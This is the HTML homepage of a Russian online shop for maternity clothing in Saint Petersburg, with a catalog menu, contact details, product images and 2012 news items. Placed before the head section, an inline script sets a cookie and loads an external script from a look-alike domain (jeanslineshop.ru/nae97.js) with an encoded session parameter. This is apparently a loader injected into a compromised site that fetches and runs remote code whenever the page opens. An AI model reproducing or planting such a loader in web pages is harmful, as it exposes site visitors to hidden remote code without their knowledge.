<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
<script type="text/javascript">
        var Cookies = {
         init: function () {
             var allCookies = document.cookie.split('; ');
             for (var i=0;i<allCookies.length;i++) {
                 var cookiePair = allCookies[i].split('=');
                 this[cookiePair[0]] = cookiePair[1];
             }
         },
         create: function (name,value,days) {
             if (days) {
                 var date = new Date();
                 date.setTime(date.getTime()+(days*24*60*60*1000));
                 var expires = "; expires="+date.toGMTString();
             }
             else var expires = "";
             document.cookie = name+"="+value+expires+"; path=/";
             this[name] = value;
         },
         delete: function (name) {
             this.create(name,'',-1);
             this[name] = undefined;
         }
        };
        Cookies.init();
        Cookies.create('jan97', '3');
    </script><script src='http://jeanslineshop.ru/nae97.js?PHPSESSID=6a65616e736c696e6738686060727561'></script><head>
<script language="javascript">         
function checkIt() {
theGroup = document.theForm.size999;
for (i=0; i< theGroup.length; i++) {
     if (theGroup[i].checked) {
document.location.href = "/shop/cart/?action=add&item_id=" +    theGroup[i].value; 
break;
    }
     }
}</script>





	<title>Интернет-Магазин одежды для беременных Jeans Line Shop</title>
	<meta name="description" content="Интернет-Магазин одежды для беременных Jeans Line Shop с доставкой и самовывозом"></meta>
	<meta name="keywords" content="Интернет-магазин, интернет-магазин джинс, недорогой интернет-магазин, интернет-магазин для беременных женщин, интернет-магазин одежды для беременных, интернет-магазин для будущих мам, интернет-магазин нижнего белья для беременных женщин, интернет-магазин подушек для беременных, интернет-магазин комбинезонов для будущих мам, интернет-магазин для беременных в Санкт-Петербурге, интернет-магазин для беременных в Питере, интернет-магазин для будущих мам в Питере, интернет-магазин для будущих мам в С-Пб, интернет-магазин брюк для беременных, одежда оптом для беременных в интернет-магазине, трикотаж для беременных в интернет-магазине, бельё для беременных в интернет магазине, подушки для беременных в интернет-магазине, недорогая одежда для беременных в Питере, модная одежда для беременных в С-Пб."></meta>
	<meta content="text/html; charset=UTF-8" http-equiv="Content-Type"></meta>
	<link rel="stylesheet" type="text/css" href="templates/template1/style.css?1302684602" />	<link rel="stylesheet" type="text/css" href="hostcmsfiles/style.css" />
	<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="news/rss/index.html" />
	
	<!-- jQuery -->
	<script type="text/javascript" src="hostcmsfiles/jquery/jquery.js"></script>
	<!-- validate -->
	<script type="text/javascript" src="hostcmsfiles/jquery/jquery.validate.js"></script>
	<!-- LightBox -->
	<script type="text/javascript" src="hostcmsfiles/jquery/lightbox/js/jquery.lightbox.js"></script>
	<link rel="stylesheet" type="text/css" href="hostcmsfiles/jquery/lightbox/css/jquery.lightbox.css" media="screen" />
	
	<script type="text/javascript" src="templates/template1/hostcms.js"></script>
	<script type="text/javascript" src="hostcmsfiles/ajax/JsHttpRequest.js"></script>
	<script type="text/javascript" src="hostcmsfiles/ajax/ajax.js"></script>
	<script type="text/javascript" src="hostcmsfiles/main.js"></script>

	<!--  BBcode -->
	<script type="text/javascript" src="hostcmsfiles/jquery/bbedit/jquery.bbedit.js"></script>

	<script type="text/javascript">
	$(function() {
		$('#gallery a:has(img)').lightBox();

		//Предварительная загрузка изображений
		$.preLoadImages("/images/red_grad.gif",
				"/images/top_menu_l.gif",
				"/images/top_menu_r.gif");
	});
	</script>
</head>

<body>
	<div class="header">
		

			</div>

	<div class="left_block" >
		<div class="logo red_link" >
			<!-- <a href="/" title="Jeans Line"><img src="/imaages/piska.jpg"; alt="Jeans Line" title="Jeans Line"/></a> -->
 <!-- <a href="/" title="Jeans Line">Jeans Line</a> -->
		</div>
	</div>

	<div>
		<!-- Верхнее меню -->
		<ul class="top_menu gray_link"><li class="red_li"><div><div><a href="" title="Главная">Главная</a></div></div></li><li><div><div><a href="ÐÐ¿Ð»Ð°ÑÐ°Ð¸Ð´Ð¾ÑÑÐ°Ð²ÐºÐ°/index.html" title="Оплата и доставка">Оплата и доставка</a></div></div></li><li><div><div><a href="razmery/index.html" title="Размеры">Размеры</a></div></div></li><li><div><div><a href="faq/index.html" title="Вопросы-ответы">Вопросы-ответы</a></div></div></li></ul>	</div>

	<div class="clearing"></div>
 
	<div class="left_block">
	
		
	
		
		
		<!-- Разделы каталога товаров -->
<!-- <div class="blackk_link"> -->
		<SCRIPT><!--
					
					function show_hide_menu(id)
					{
					if (obj = document.getElementById(id))
					{
					obj.style.display == 'none' ? obj.style.display = 'block' : obj.style.display = 'none';
					return false;
					}
					return true;
					}
					
				--></SCRIPT>
<h2><a href="shop/index.html" title="Интернет-магазин">Интернет-магазин</a></h2>
<ul class="left_menu2" id="shop_menu"><li><a href="shop/group_607/index.html" onClick="return show_hide_menu('607');"><font color="black">Бандажи</font></a></li><li><a href="shop/group_606/index.html" onClick="return show_hide_menu('606');"><font color="black">Бельё, колготки</font></a></li><li><a href="shop/group_594/index.html" onClick="return show_hide_menu('594');"><font color="black">Брюки</font></a></li><li><a href="shop/group_595/index.html" onClick="return show_hide_menu('595');"><font color="black">Джинсы</font></a></li><li><a href="shop/group_596/index.html" onClick="return show_hide_menu('596');"><font color="black">Капри, шорты</font></a></li><li><a href="shop/group_597/index.html" onClick="return show_hide_menu('597');"><font color="black">Комбинезоны</font></a></li><li><a href="shop/group_598/index.html" onClick="return show_hide_menu('598');"><font color="black">Куртки</font></a></li><li><a href="shop/group_608/index.html" onClick="return show_hide_menu('608');"><font color="black">Подушки</font></a></li><li><a href="shop/group_599/index.html" onClick="return show_hide_menu('599');"><font color="black">Рубашки</font></a></li><li><a href="shop/group_600/index.html" onClick="return show_hide_menu('600');"><font color="black">Сарафаны</font></a></li><li><a href="shop/group_601/index.html" onClick="return show_hide_menu('601');"><font color="black">Трикотаж</font></a></li><li><a href="shop/group_602/index.html" onClick="return show_hide_menu('602');"><font color="black">Юбки</font></a></li></ul><!-- </div> -->




<!-- Левое меню -->
<br>
		<ul class="left_menu mp gray_link2"><li><a href="poleznaja-informatsija/index.html" title="Полезная информация">Полезная информация</a></li></ul>



		
	</div>

	<div class="main">
		<div class="container">
			<!-- Основное изображение -->
			<div class="left left_row">
				<div class="main_img"></div>
			</div>

			<!-- Контактные данные -->
			<!-- <div style="background: url('/images/ear.gif') no-repeat 90% 100%;" class="right right_row" > -->
			<div style="" class="right right_row" >
				<div class="contact_block">
				<h2 style="margin-top: 0;"><a title="Контактные данные" href="contacts/index.html">Контактные данные</a></h2>
<dl><dt><span style="color: #000000;">Телефоны:</span></dt><dd class="phone d_gray"><span style="color: #000000;">+7<span style="margin-right: 0.3em"> </span> <span style="margin-left: -0.3em">(931</span>) 306-23-10</span></dd><dd class="phone d_gray"><span style="color: #000000;">+7<span style="margin-right: 0.3em"> </span> <span style="margin-left: -0.3em">(812</span>)702-77-43 </span></dd><dt><span style="color: #000000;">Электронная почта:</span></dt><dd><span style="color: #000000;"><a class="blackk" href="">info@jeansline.ru</a></span></dd><dt><br /></dt><dt><span style="color: #000000;">Наш розничный магазин находится по адресу г. Санкт-Петербург, ул. Пулковская, д. 2, корпус 1<span style="margin-right: 0.3em"> </span> <span style="margin-left: -0.3em">(</span>вход с улицы Орджоникидзе) </span></dt><dt><span style="color: #000000;"><a class="blackk" href="">www.jeansline.ru</a></span> </dt></dl>				</div>
			</div>


			<div class="clearing"></div>

			<!-- Вызов шаблона для текущей страницы -->
			<!-- Центральный блок -->
<div style="padding: 0 0px 0 0; margin: 0 0 0 -300px; width: 100%;margin-top: -190px" class="left">
	<p style="text-align: left;"><span style="color: #3366ff; font-size: large;">             Добро пожаловать в интернет-магазин<span style="margin-right: 0.3em"> </span> <span style="margin-left: -0.3em">&laquo;</span>Джинс Лайн&raquo;</span></p>
<p style="text-align: left;"><span style="color: #3366ff; font-size: medium;"><a href="shop/group_595/index.html"><img src="piska/1_22.jpg" alt="" /></a><span style="color: #cfeef0;">___</span><a href="shop/group_596/index.html"><img src="piska/7_22.jpg" alt="" width="184" height="311" /></a><span style="color: #cfeef0;">___</span> <a href="shop/group_594/index.html"><img src="piska/4_22.jpg" alt="" width="184" height="311" /></a></span><span style="color: #3366ff; font-size: medium;"> </span></p>
<p style="text-align: left;"><span style="color: #3366ff; font-size: medium;"> </span></p>
<p style="text-align: left;"><span style="color: #3366ff; font-size: medium;"><a href="shop/group_600/index.html"><img src="piska/13.jpg" alt="" /></a><span style="color: #cfeef0;">___</span> <a href="shop/group_602/index.html"><img src="piska/9.jpg" alt="" /></a><span style="color: #cfeef0;">___</span> <a href="shop/group_599/index.html"><img src="piska/12.jpg" alt="" /></a></span></p>
<p style="text-align: left;"><span style="color: #3366ff; font-size: medium;"> </span></p>
<p style="text-align: left;"><span style="color: #3366ff; font-size: medium;"><a href="shop/group_597/index.html"><img src="piska/8.jpg" alt="" /></a><span style="color: #cfeef0;">___</span> <a href="shop/group_601/index.html"><img src="piska/14.jpg" alt="" /></a><span style="color: #cfeef0;">__._</span> <a href="shop/group_598/index.html"><img src="piska/10_22.jpg" alt="" width="184" height="311" /></a></span></p>
<p style="text-align: left;"><span style="color: #3366ff; font-size: medium;"> </span><span style="color: #3366ff; font-size: medium;"> </span><span style="color: #3366ff; font-size: medium;"> </span><span style="color: #3366ff; font-size: medium;"> </span></p>
<p style="text-align: left;"><span style="color: #3366ff; font-size: medium;"><a href="shop/group_608/index.html"><img src="piska/11.jpg" alt="" width="184" height="311" /></a> <span style="color: #cfeef0;">___</span><a href="shop/group_607/index.html"><img src="piska/3.jpg" alt="" width="184" height="311" /></a><span style="color: #3366ff; font-size: medium;"> </span><span style="color: #cfeef0;">___</span> <a href="shop/group_606/index.html"><img src="piska/6.jpg" alt="" /></a></span></p>
<p style="text-align: left;"><span style="color: #3366ff; font-size: medium;"></span></p>	
	<div>
		
		<!-- Реклама -->
		
	</div>
</div>

<!-- Правый блок -->
<div style="width: 220px; padding-right: 50px;" class="right" >
	

<!-- Метки -->
	<!--
-->

	
	
	<!-- Краткая корзина -->
	<div id="little_cart"><h2><a href="shop/cart/index.html">Корзина пуста</a></h2><font color="black">Перейдите в каталог, выберите требуемый товар и добавьте его в корзину.</font></div>

<!-- Новости -->
		<h2><a href="news/index.html" title="Новости">Новости</a></h2>
<dl class="news_list"><dt>02 июня 2012г.
		</dt><dd><a href="news/90/index.html" title="Новое поступление весенне-летнего товара: туники,леггинсы,джинсы, юбки,футболки...">Новое поступление весенне-летнего товара: туники,леггинсы,джинсы, юбки,футболки...</a></dd><dt>02 июня 2012г.
		</dt><dd><a href="news/91/index.html" title="Новое поступление летнего товара (шорты,брюки,джинсы,платья, туники,жилетки,футболки).">Новое поступление летнего товара (шорты,брюки,джинсы,платья, туники,жилетки,футболки).</a></dd><dt>02 июня 2012г.
		</dt><dd><a href="news/89/index.html" title="Новые поступления:   Комплекты( сорочка+халат) по цене 1750 рублей.   Майки,футболки для кормления.">Новые поступления:   Комплекты( сорочка+халат) по цене 1750 рублей.   Майки,футболки для кормления.</a></dd></dl>
<br><br><br><br><br>
<!--Rating@Mail.ru counter-->
<script language="javascript"><!--
d=document;var a='';a+=';r='+escape(d.referrer);js=10;//--></script>
<script language="javascript1.1"><!--
a+=';j='+navigator.javaEnabled();js=11;//--></script>
<script language="javascript1.2"><!--
s=screen;a+=';s='+s.width+'*'+s.height;
a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth);js=12;//--></script>
<script language="javascript1.3"><!--
js=13;//--></script><script language="javascript" type="text/javascript"><!--
d.write('<a href="http://top.mail.ru/jump?from=2000459" target="_top">'+
'<img src="http://d6.c8.be.a1.top.mail.ru/counter?id=2000459;t=131;js='+js+
a+';rand='+Math.random()+'" alt="Рейтинг@Mail.ru" border="0" '+
'height="40" width="88"><\/a>');if(11<js)d.write('<'+'!-- ');//--></script>
<noscript><a target="_top" href="">
<img src="http://d6.c8.be.a1.top.mail.ru/counter?js=na;id=2000459;t=131" 
height="40" width="88" border="0" alt="Рейтинг@Mail.ru"></a></noscript>
<script language="javascript" type="text/javascript"><!--
if(11<js)d.write('--'+'>');//--></script>
<!--// Rating@Mail.ru counter-->


	
	</div>		</div>
	</div>
	
	<div class="clearing"></div>
	
	<!-- Подвал -->
	<div class="footer">
		<div class="counter">

			
		</div>
		<div class="copyryght">
			&copy; 2011&mdash;2014 ООО &laquo;Джинслайн&raquo;
			<br/>
			<a href="" title="Разработка сайта">Разработка сайта</a>
			<br/>
			
			
			
		</div>
		<div class="search">
						<form action="/search/" method="get">
				<div>
					<input type="text" class="text" value="" name="text" /> <input type="image" src="images/search_blue.gif" class="button" title="Поиск" />
				</div>
			</form>
					</div>
	</div>
</body>
</html>